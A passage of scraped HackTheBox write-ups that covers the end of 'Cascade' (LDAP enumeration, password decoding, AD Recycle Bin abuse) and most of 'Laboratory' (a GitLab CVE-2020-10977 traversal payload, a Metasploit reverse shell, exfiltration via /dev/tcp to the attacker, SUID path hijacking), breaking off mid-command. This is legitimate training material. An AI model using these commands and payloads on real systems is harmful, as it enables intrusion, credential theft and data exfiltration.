S-1–5–21–3332504370–1206983947–1165150453–513 S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE\\Domain Users (2) After enough digging, I did a password spray with a pattern of “username%username”, but no luck.\nBefore moving on, I\u0026rsquo;ll note the Remote Management Users group members:\n arksvc s.smith  TCP 389 - LDAP In LDAP, anonymous login are also allowed.\n→ root@iamf «cascade» «192.168.43.234» $ ldapsearch -h \u0026#39;10.10.10.182\u0026#39; -x -b \u0026#34;dc=cascade,dc=local\u0026#34; \u0026gt; ldap-enum  Nmap already identifies the Active Directory domain name as cascade.local. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows \u0026ldquo;DC=NAME,DC=TLD\u0026rdquo;.\n cascade = NAME local = TLD (Top-Level Domain)   While examining the output from ldap-enum, I spotted an interesting line from user Ryan Thompson.\n...\u0026lt;snip\u0026gt;... displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson ...\u0026lt;snip\u0026gt;... logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local ...\u0026lt;snip\u0026gt;... lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0 cascadeLegacyPwd: clk0bjVldmE= The cascadeLegacyPwd: clk0bjVldmE= line only appears on Ryan Thompson section and it can be decoded into rY4n5eva.\n→ root@iamf «cascade» «192.168.43.234» $ echo clk0bjVldmE= | base64 -d rY4n5eva I\u0026rsquo;ll mark the accounts that have a logonCount value greater than one:\nAccess as r.thompson It turns out that the decoded cascadeLegacyPwd is r.thompson \u0026rsquo;s password.\nWith r.thompson creds, I can see all the available shares.\n→ root@iamf «cascade» «192.168.43.234» $ crackmapexec smb cascade.htb -u r.thompson -p \u0026#39;rY4n5eva\u0026#39; --shares Data share In Data shares, r.thompson is only allowed to read IT folder. I\u0026rsquo;ll pull all the files from the IT folder using smbget.\n Recall enumeration via RPC, r.thompson is a member of the IT group.\n → root@iamf «cascade» «192.168.43.234» $ smbget -R smb://cascade.htb/Data/IT/ -U r.thompson Here is the directory structure. I\u0026rsquo;ll take a look on Meeting_Notes_June_2018.html\n→ root@iamf «Data» «192.168.43.234» $ tree . └── IT ├── Email Archives │ └── Meeting_Notes_June_2018.html ├── LogonAudit ├── Logs │ ├── Ark AD Recycle Bin │ │ └── ArkAdRecycleBin.log │ └── DCs │ └── dcdiag.log └── Temp ├── r.thompson └── s.smith └── VNC Install.reg 9 directories, 4 files I can read the Meeting_Notes_June_2018.html\u0026rsquo;s content using browser. I drew a red line to indicate something important.\nThe second interesting file is VNC Install.reg. It contains a stored password which can be decrypted according to this GitHub (https://github.com/frizb/PasswordDecrypts)\n□□Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC] [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] ...\u0026lt;snip\u0026gt;... \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f ...\u0026lt;snip\u0026gt;... The third interesting file is ArkAdRecycleBin.log. It looks like a log from a custom application. I\u0026rsquo;ll take note on \u0026ldquo;Moving object to AD recycle bin CN=TempAdmin\u0026rdquo; part.\n1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 1/10/2018 15:43 [MAIN_THREAD] Validating settings... 1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied 1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5 2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 2/10/2018 15:56 [MAIN_THREAD] Validating settings... 2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0 8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 8/12/2018 12:22 [MAIN_THREAD] Validating settings... 8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0 As for dcdiag.log, up until now, I had no idea what that log was about.\nFoothold Shell as s.smith Decrypt VNC Password The VNC password can be decrypted using metasploit irb (interactive ruby).\n\u0026gt;\u0026gt; fixedkey = \u0026#34;\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\u0026#34; =\u0026gt; \u0026#34;\\x17Rk\\x06#NX\\a\u0026#34; \u0026gt;\u0026gt; require \u0026#39;rex/proto/rfb\u0026#39; =\u0026gt; true \u0026gt;\u0026gt; Rex::Proto::RFB::Cipher.decrypt [\u0026#34;6BCF2A4B6E5ACA0f\u0026#34;].pack(\u0026#39;H*\u0026#39;), fixedkey =\u0026gt; \u0026#34;sT333ve2\u0026#34; Since it was discovered in s.smith\u0026rsquo;s folder, I may try this decrypted password on user s.smith.\nRemote Access From RPC enumeration, I already knew that user s.smith is a member of Remote Management Users, so I could try it with evil-winrm and it works.\n→ root@iamf «Data» «192.168.43.234» $ evil-winrm -i cascade.htb -u s.smith -p \u0026#39;sT333ve2\u0026#39; I can grab user flag.\nPrivilege Escalation Shell as arksvc Audit$ share After enumerating s.smith\u0026rsquo;s privileges and groups, CASCADE\\Audit Share reminds me to the Audit$ share, to which I previously had no access.\nI have read permissions now on Audit$.\nThis share appears to contain an entire software application.\n→ root@iamf «Data» «192.168.43.234» $ smbclient -U s.smith \\\\\\\\cascade.htb\\\\Audit$ I\u0026rsquo;ll pull them all from Cascade to my Kali\n→ root@iamf «Data» «192.168.43.234» $ smbget -R smb://cascade.htb/Audit$ -U s.smith And then send them over to my Windows.\n→ root@iamf «Audit$» «192.168.43.234» $ tree . ├── CascAudit.exe ├── CascCrypto.dll ├── DB │ └── Audit.db ├── RunAudit.bat ├── System.Data.SQLite.dll ├── System.Data.SQLite.EF6.dll ├── x64 │ └── SQLite.Interop.dll └── x86 └── SQLite.Interop.dll 3 directories, 8 files → root@iamf «Audit$» «192.168.43.234» $ file CascAudit.exe CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Analyzing Audit.db Audit.db is an SQlite3 database. As I\u0026rsquo;m analyzing on my Windows without SQLite installed, I\u0026rsquo;ll use an online SQLite viewer.\nThere are four tables in the database.\nThe records of the deleted AD object are kept in the DeletedUserAudit table.\nThe Ldap table contains the credentials for ArkSvc.\nThe password is not a simple base64 encoded string, but it is encrypted.\n→ root@iamf «Audit$» «192.168.43.234» $ echo \u0026#39;BQO5l5Kj9MdErXx6Q6AGOw==\u0026#39; | base64 -d ♣♥□□□□□□D□|zC□♠;# Analyzing CascAudit.exe I tried to run the program on my PC, but it produced the following errors.\n Don\u0026rsquo;t run an untrusted binary you downloaded from a CTF box.\n I use a tool called dnSpy to reverse CascAudit.exe.\nOnce it is loaded, I\u0026rsquo;ll go straight to the main function.\npublic static void Main() { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line args specified. Must specify database path only\u0026#34;); return; } ...\u0026lt;snip\u0026gt;... try { sqliteConnection.Open(); using (SQLiteCommand sqliteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sqliteConnection)) { using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) { sqliteDataReader.Read(); str = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]); str2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex.Message); return; } } } sqliteConnection.Close(); } ...\u0026lt;snip\u0026gt;... Let\u0026rsquo;s break it down.\nIn order for the program to run properly, I need to specify the database path as its first argument.\n...\u0026lt;snip\u0026gt;... if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line args specified. Must specify database path only\u0026#34;); return; } ...\u0026lt;snip\u0026gt;... If the condition above is satisfied, it opens an SQL connection and fetches all data from the Ldap table. Each of them is then stored to str, str2, and password.\n...\u0026lt;snip\u0026gt;... sqliteConnection.Open(); using (SQLiteCommand sqliteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sqliteConnection)) { using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) { sqliteDataReader.Read(); str = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]); str2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } ...\u0026lt;snip\u0026gt;... The interesting part in the code above is, of course, the password decrypt line. Now because I only need the decrypt function, I could remove all the codes and put only this line below on the main function and then print it out using Console.Write().\npassword = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); Decrypt Password First, I\u0026rsquo;ll enter edit mode on the current main function\nThen, I could only use the decrypt function in the main function. So the main function code now looks like this.\nI\u0026rsquo;ll save it as a new program called CascAuditModified.exe.\nNow if I run it, I get the decrypted password.\n┌─「iamf@MSI」 ‣ 「/mnt/z/Shared/Audit$」 ᓚᘏᗢ [172.17.146.164] └─╼$ ./CascAuditModified.exe w3lc0meFr31nd Remote Access - Arksvc From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with evil-winrm.\n→ root@iamf «Data» «192.168.43.234» $ evil-winrm -i cascade.htb -u arksvc -p \u0026#39;w3lc0meFr31nd\u0026#39; Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; Shell as NT Authority\\System Enumeration I\u0026rsquo;ll wrap it up:\nFirst, recall from RPC enumeration that user ArkSvc is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.\nSecond, according to the email sent by Steve Smith, there is a temporary admin account called TempAdmin that uses the same password as the \u0026ldquo;normal\u0026rdquo; admin account.\nBut, based on ArkAdRecycleBin.log, TempAdmin has been moved into AD Recycle Bin.\n...\u0026lt;snip\u0026gt;... 8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0 And now using ArksSvc account, I can search all the deleted objects using the command below:\n*Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; Get-ADObject -filter \u0026#39;isDeleted -eq $true\u0026#39; -includeDeletedObjects -Properties * -includeDeletedObjects -SearchBase \u0026#34;DC=cascade,DC=local\u0026#34; After looking through the output, I noticed that TempAdmin has one interesting properties. It is another cascadeLegacyPwd.\nI can decode the value to plaintext\n→ root@iamf «Data» «192.168.43.234» $ echo \u0026#39;YmFDVDNyMWFOMDBkbGVz\u0026#39; | base64 -d baCT3r1aN00dles TempAdmin:baCT3r1aN00dles\nRemote Access - NT Authority\\System The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\\System using psexec.py.\n→ root@iamf «Data» «192.168.43.234» $ psexec.py cascade.local/administrator:\u0026#39;baCT3r1aN00dles\u0026#39;@cascade.htb  References  https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-cascade/","summary":"Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by VbScrub, the creator of Nest. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","SMB","rpcclient","VNC","dotNET","Csharp","dnSpy","Reverse-engineering","AD-Recycle-Bin","psexec.py","evil-winrm"],"title":"HackTheBox - Cascade"},{"content":"Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application\u0026rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container finds a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine. From there, I\u0026rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls chmod with relative path, making it vulnerable to path hijacking.\nSkills Learned  Arbitrary File Read Adding Metasploit module Exploiting GitLab 12.8.1~12.9.0 Recover a git repository SUID exploitation  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Metasploit - Preinstalled in Kali Linux CVE-2020-10997 Exploit PoC - https://github.com/thewhiteh4t/cve-2020-10977  Reconnaissance Nmap Initial scan with nmap shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.\n→ root@iamf «laboratory» «10.10.14.39» $ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Issuer: commonName=laboratory.htb | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-07-05T10:39:28 | Not valid after: 2024-03-03T10:39:28 | MD5: 2873 91a5 5022 f323 4b95 df98 b61a eb6c |_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the scan above, visiting port 80 will be redirected to https://laboratory.htb.\nOn the HTTPS port, the certificate discloses a subdomain.\nFrom here, I\u0026rsquo;ll add laboratory.htb and git.laboratory.htb as well to /etc/hosts\n→ root@iamf «laboratory» «10.10.14.39» $ echo \u0026#39;10.10.10.216 laboratory.htb git.laboratory.htb\u0026#39; \u0026gt; /etc/hosts Enumeration TCP 80 - laboratory.htb There is nothing really interesting here.\nTCP 443 - git.laboratory.htb A GitLab instance is presented on this page.\nI tried to register an account, but GitLab rejected it by saying the email domain was not authorized.\nI changed my email to iamf@laboratory.htb and it works.\nThe first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.\nI found another user on this website named Dexter McPherson. This user has a project called SecureWebsite\nSearchsploit searchsploit shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.\n→ root@iamf «laboratory» «10.10.14.39» $ searchsploit gitlab ------------------------------------------------------------------------- ----------------------------- Exploit Title | Path ------------------------------------------------------------------------- ----------------------------- GitLab - \u0026#39;impersonate\u0026#39; Feature Privilege Escalation | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py GitLab 12.9.0 - Arbitrary File Read | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated) | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit) | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - \u0026#39;repository\u0026#39; Remote Command Execution | json/webapps/47420.txt ------------------------------------------------------------------------- ------------------------------ Foothold Shell as git GitLab CVE-2020-10977 - Manual  CVE-2020-10977: GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.\n The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at Hackerone. The researcher also shows how that vulnerability can be turned into a remote code execution.\nI\u0026rsquo;ll reproduce the vulnerability by creating two projects. I\u0026rsquo;ll name it as \u0026ldquo;project1\u0026rdquo; and \u0026ldquo;project2\u0026rdquo;.\nAfter that I\u0026rsquo;ll create an issue on \u0026ldquo;project2\u0026rdquo; and fill the issue description with a payload as follows:\n![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) I\u0026rsquo;ll then move the issue on \u0026ldquo;project2\u0026rdquo; to \u0026ldquo;project1\u0026rdquo;\nThe payload will then turn into an attached file.\nThe attached file contains the content of /etc/passwd file from the system.\nGitLab CVE-2020-10977 - Automated There is also an automated version to exploit this vulnerability written in Python.\n→ root@iamf «laboratory» «10.10.14.39» $ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf ...\u0026lt;SNIP\u0026gt;... [+] Target : https://git.laboratory.htb [+] Username : iamf [+] Password : iamfiamf [+] Project Names : ProjectOne, ProjectTwo [!] Trying to Login... [+] Login Successful! [!] Creating ProjectOne... [+] ProjectOne Created Successfully! [!] Creating ProjectTwo... [+] ProjectTwo Created Successfully! [\u0026gt;] Absolute Path to File : /etc/passwd [!] Creating an Issue... [+] Issue Created Successfully! [!] Moving Issue... [+] Issue Moved Successfully! [+] File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd \u0026gt; /etc/passwd ---------------------------------------- ...\u0026lt;SNIP\u0026gt;... git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh ...\u0026lt;SNIP\u0026gt;... LFI to RCE To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab secret_key_base with the one on Laboratory (located on /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml). After that all is set, I\u0026rsquo;ve to craft my own cookie to get the code execution on the system.\nFortunately, there is a Metasploit module to perform this automatically, and I’ll use that.\nFirst, I’ll have to grab the module from GitHub and put it into /usr/share/metasploit-framework/modules/exploits/multi/http.\n→ root@iamf «laboratory» «10.10.14.39» $ cd /usr/share/metasploit-framework/modules/exploits/multi/http \u0026amp;\u0026amp; wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb After that I’ll re-initialize the metasploit database using msfdb.\n→ root@iamf «laboratory» «10.10.14.39» $ msfdb reinit [+] Starting database [+] Dropping databases \u0026#39;msf\u0026#39; [+] Dropping databases \u0026#39;msf_test\u0026#39; [+] Dropping database user \u0026#39;msf\u0026#39; [+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml [+] Stopping database [+] Starting database [+] Creating database user \u0026#39;msf\u0026#39; [+] Creating databases \u0026#39;msf\u0026#39; [+] Creating databases \u0026#39;msf_test\u0026#39; [+] Creating configuration file \u0026#39;/usr/share/metasploit-framework/config/database.yml\u0026#39; [+] Creating initial database schema Now on Metasploit, I can use the module by issuing the command below:\nmsf6 \u0026gt; use exploit/multi/http/gitlab_file_read_rce [*] No payload configured, defaulting to generic/shell_reverse_tcp Below are the options needed by the module.\nmsf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set USERNAME iamf USERNAME =\u0026gt; iamf msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set PASSWORD iamfiamf PASSWORD =\u0026gt; iamfiamf msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set RHOSTS 10.10.10.216 RHOSTS =\u0026gt; 10.10.10.216 msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set RPORT 443 RPORT =\u0026gt; 443 msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set SSL true [!] Changing the SSL option’s value may require changing RPORT! SSL =\u0026gt; true msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set VHOST git.laboratory.htb VHOST =\u0026gt; git.laboratory.htb msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set LPORT 9001 LPORT =\u0026gt; 9001 After all the required options are set, I’ll start the exploit with the run command.\nmsf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.39:9001 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version. [*] Logged in to user iamf [*] Created project /iamf/hpt2TORA [*] Created project /iamf/ysGE0u0L [*] Created issue /iamf/hpt2TORA/issues/1 [*] Executing arbitrary file load [+] File saved as: \u0026#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt\u0026#39; [+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 [*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read [*] Attempting to delete project /iamf/hpt2TORA [*] Deleted project /iamf/hpt2TORA [*] Attempting to delete project /iamf/ysGE0u0L [*] Deleted project /iamf/ysGE0u0L [*] Command shell session 1 opened (10.10.14.39:9001 -\u0026gt; 10.10.10.216:52726) at 2021-03-21 17:46:14 -0400 id;hostname uid=998(git) gid=998(git) groups=998(git) git.laboratory.htb I have shell as user git.\nThere is a .dockerenv file in the root directory, which indicates that I\u0026rsquo;m inside a docker container.\nls -la / total 88 drwxr-xr-x 1 root root 4096 Jul 2 2020 . drwxr-xr-x 1 root root 4096 Jul 2 2020 .. -rwxr-xr-x 1 root root 0 Jul 2 2020 .dockerenv -rw-r--r-- 1 root root 157 Feb 24 2020 RELEASE drwxr-xr-x 2 root root 4096 Feb 24 2020 assets Privilege Escalation Shell as dexter Container enumeration Enumerating the git home directory (/var/opt/gitlab) discovers two repositories that belongs to user dexter.\ngit@git:~$ grep -Ri dexter 2\u0026gt;/dev/null git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config: fullpath = dexter/securedocker git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config: fullpath = dexter/securewebsite I haven\u0026rsquo;t seen that dexter/securedocker before in the GitLab application. So I\u0026rsquo;ll grab that repository and transfer it to my machine\ngit@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git total 40 drwxr-s--- 6 git root 4096 Jul 5 2020 . drwxr-s--- 4 git root 4096 Jul 5 2020 .. -rw-r--r-- 1 git root 23 Jul 5 2020 HEAD -rw-r--r-- 1 git root 107 Jul 5 2020 config -rw-r--r-- 1 git root 73 Jul 5 2020 description drwxr-sr-x 2 git root 4096 Jul 5 2020 hooks drwxr-sr-x 2 git root 4096 Jul 5 2020 info -rw-r--r-- 1 git root 112 Jul 5 2020 language-stats.cache drwxr-sr-x 14 git root 4096 Jul 5 2020 objects drwxr-sr-x 4 git root 4096 Jul 5 2020 refs First, I’ll create a tarball archive of that repository and I’ll name it as exfil-securedocker-git.tar.\ngit@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git On my machine, I\u0026rsquo;ll setup a listener\n→ root@iamf «loot» «10.10.14.39» $ nc -nvlp 9000 \u0026gt; exfil-securedocker-git.tar Back on Laboratory, I’ll send the repository tarball to my machine using cat and bash trick\ngit@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar \u0026gt; /dev/tcp/10.10.14.39/9000 My listener received the tarball.\n→ root@iamf «loot» «10.10.14.39» $ nc -nvlp 9000 \u0026gt; exfil-securedocker-git.tar listening on [any] 9000 ... connect to [10.10.14.39] from (UNKNOWN) [10.10.10.216] 42426 Recovering \u0026lsquo;securedocker\u0026rsquo; repository After extracting the repository, I saw git:(master) pop up in my zsh prompt which indicates this is a git repository.\nBut, when I try to read the repository status, it returns an error message.\n→ root@iamf «loot» «10.10.14.39» $ tar -xzf exfil-securedocker-git.tar → root@iamf «loot» «10.10.14.39» $ cd 19581e27de7ced....5ef03f7c3017bb5b7.git → root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:(master) $ git status fatal: this operation must be run in a work tree  I\u0026rsquo;ve renamed 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git to secure-docker.git.\n This problem can be resolved by creating a new .git folder within secure-docker.git and transferring all the files from secure-docker.git to the newly created .git.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ mkdir .git → root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ mv * .git → root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ git status fatal: this operation must be run in a work tree Finally, use the git init command to re-initialize the git repository.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ git init Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docer.git/.git/ → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ git status On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) deleted: README.md deleted: create_gitlab.sh deleted: dexter/.ssh/authorized_keys deleted: dexter/.ssh/id_rsa deleted: dexter/recipe.url deleted: dexter/todo.txt Interestingly, this repository contains a set of SSH keys.\nSSH - dexter I can restore the deleted files with git checkout -- command.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ git checkout -- → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ls -la total 20 drwxr-xr-x 3 root root 4096 Mar 22 09:36 . drwxr-xr-x 4 root root 4096 Mar 22 09:36 .. -rw-r--r-- 1 root root 102 Mar 22 09:36 recipe.url drwxr-xr-x 2 root root 4096 Mar 22 09:36 .ssh -rw-r--r-- 1 root root 160 Mar 22 09:36 todo.txt I can now login as dexter using the SSH key I obtained.\nAt first try, it says the key is invalid format.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ chmod 600 dexter/.ssh/id_rsa → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216 Load key \u0026#34;id_rsa\u0026#34;: invalid format dexter@10.10.10.216: Permission denied (publickey). I fixed that by adding an empty string using the echo command.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ echo \u0026#39;\u0026#39; \u0026gt;\u0026gt; dexter/.ssh/id_rsa Now it logs me in.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ssh -i id_rsa dexter@10.10.10.216 dexter@laboratory:~$ dexter@laboratory:~$ id;hostname uid=1000(dexter) gid=1000(dexter) groups=1000(dexter) laboratory dexter@laboratory:~$ ls -l total 4 -r--r----- 1 root dexter 33 Mar 22 10:06 user.txt Shell as root Enumeration The contents of todo.txt talks something about “docker security”, but I have no idea what it is except it uses three hashtags.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ cat dexter/todo.txt # DONE: Secure docker for regular users ### DONE: Automate docker security on startup # TODO: Look into \u0026#34;docker compose\u0026#34; # TODO: Permanently ban DeeDee from lab# It turns out it’s a binary name which has a SUID bit set found by Linpeas.\n...\u0026lt;SNIP\u0026gt;... ════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms -rwsr-xr-x 1 root dexter 17K Aug 28 2020 /usr/local/bin/docker-security Inspecting the binary with the ltrace command finds out that it uses relative path to call chmod.\ndexter@laboratory:~$ ltrace 